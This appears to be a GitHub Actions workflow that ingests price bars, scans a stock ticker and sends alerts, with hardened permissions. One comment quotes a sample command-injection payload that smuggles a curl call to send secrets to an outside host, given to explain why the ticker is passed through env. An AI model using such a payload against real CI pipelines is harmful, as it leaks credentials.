name: Analyze Single Ticker
# Triggered by watchlist POST when a user adds a new ticker — the
# default 17:00 KST cron picks up newcomers automatically, but this
# workflow gives an "instant analysis" experience (~2-3 min from
# dispatch to results in DB).
#
# Works for both KR and US tickers:
#   - KR: ingest_bars resamples FDR daily → W+M, scan_daily reads W bars
#         from `bars` and computes the 17-pattern analysis.
#   - US: ingest_bars fetches Naver weekCandle + monthCandle directly
#         (yfinance is blocked on cloud runners), scan_daily analyses
#         the weekly view. Book primary signal stays valid since the
#         engine prioritizes monthly + weekly anyway.
#
# Fan-in safety: concurrent dispatches for the same ticker collapse via
# `concurrency` (per-ticker group). Dispatches for different tickers
# run in parallel up to the runner pool size.

# Lock down GITHUB_TOKEN — defaults to repo read-write; these
# workflows only need read for checkout (no commits/PRs/issues from
# them). Defense in depth in case any third-party action gets pwned.
permissions:
  contents: read

on:
  workflow_dispatch:
    inputs:
      ticker:
        description: "Canonical ticker (e.g. 005380.KS, AAPL)"
        required: true
        type: string

concurrency:
  group: analyze-ticker-${{ inputs.ticker }}
  cancel-in-progress: false

jobs:
  analyze:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"
          cache-dependency-path: requirements.txt

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install supabase "psycopg[binary]"

      - name: Ingest bars (weekly + monthly) for this ticker
        # 2026-05-28 — TICKER passed via env (not direct ${{}} into shell)
        # to block command injection. Direct interpolation lets anyone
        # with workflow_dispatch rights leak the entire env block via a
        # crafted ticker payload (`aapl"; curl https://x/$SECRET #`).
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          SUPABASE_DB_PASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
          TICKER: ${{ inputs.ticker }}
        run: |
          # One-shot bar ingest so the chart endpoint (/api/chart) AND
          # the analyzer both see the bars. KR uses FDR daily → resample
          # W+M, US uses Naver weekCandle + monthCandle directly.
          python -m app.db.ingest_bars --tickers "$TICKER"

      - name: Scan one ticker
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          SUPABASE_DB_PASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
          FRED_API_KEY: ${{ secrets.FRED_API_KEY }}
          TICKER: ${{ inputs.ticker }}
        run: |
          # scan_daily reads bars(granularity='W') and writes
          # analyze_results + scan_results. The previous step seeded
          # bars; this step computes the 17-pattern analysis.
          python -m app.db.scan_daily --tickers "$TICKER" --years 2

      - name: Send any new alerts
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          SUPABASE_DB_PASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          VAPID_PUBLIC_KEY: ${{ secrets.VAPID_PUBLIC_KEY }}
          VAPID_PRIVATE_KEY: ${{ secrets.VAPID_PRIVATE_KEY }}
          VAPID_CONTACT_EMAIL: ${{ secrets.VAPID_CONTACT_EMAIL }}
        run: |
          # Idempotent: dedupes via the `alerts` table so an unchanged
          # signal from earlier in the day won't fire twice.
          python -m app.db.telegram_worker
